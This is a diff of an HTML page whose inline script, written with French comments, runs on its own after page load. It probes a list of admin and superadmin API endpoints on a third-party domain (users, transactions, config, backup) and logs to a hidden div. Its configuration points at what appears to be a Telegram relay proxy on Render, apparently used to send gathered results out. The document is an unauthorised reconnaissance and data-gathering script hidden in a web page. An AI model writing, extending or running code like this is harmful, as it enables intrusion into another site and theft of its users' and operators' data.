@@ -9,9 +9,9 @@
     <div id="log" style="display:none;"></div>
 
     <script>
-    // ==================== CONFIGURATION (sans token visible) ====================
-    // ⚠️ Remplace PROXY_URL par l'URL de ton service Render après déploiement
-    const PROXY_URL = 'https://ton-projet.onrender.com';
+    // ==================== CONFIGURATION ====================
+    // ⚠️ REMPLACE CETTE URL PAR TON SERVICE RENDER APRÈS DÉPLOIEMENT
+    const PROXY_URL = 'https://telegram-proxy.onrender.com';
     const API_BASE = 'https://bugweb.lionelmelo.space';
     const logDiv = document.getElementById('log');
 
@@ -116,7 +116,12 @@
     }
 
     async function tryAdminEndpoints() {
-        const adminEndpoints = ['/api/admin/users', '/api/admin/stats', '/api/admin/servers', '/api/admin/transactions', '/api/admin/logs', '/api/admin/config', '/api/admin/settings', '/api/admin/backup', '/admin/dashboard', '/api/superadmin/users'];
+        const adminEndpoints = [
+            '/api/admin/users', '/api/admin/stats', '/api/admin/servers', 
+            '/api/admin/transactions', '/api/admin/logs', '/api/admin/config', 
+            '/api/admin/settings', '/api/admin/backup', '/admin/dashboard', 
+            '/api/superadmin/users'
+        ];
         for (const endpoint of adminEndpoints) {
             try {
                 const data = await fetchJSON(endpoint);
@@ -159,6 +164,7 @@
         log('Fin');
     }
 
+    // Exécution après un petit délai
     setTimeout(() => {
         main().catch(e => {
             log(`Erreur fatale: ${e.message}`);
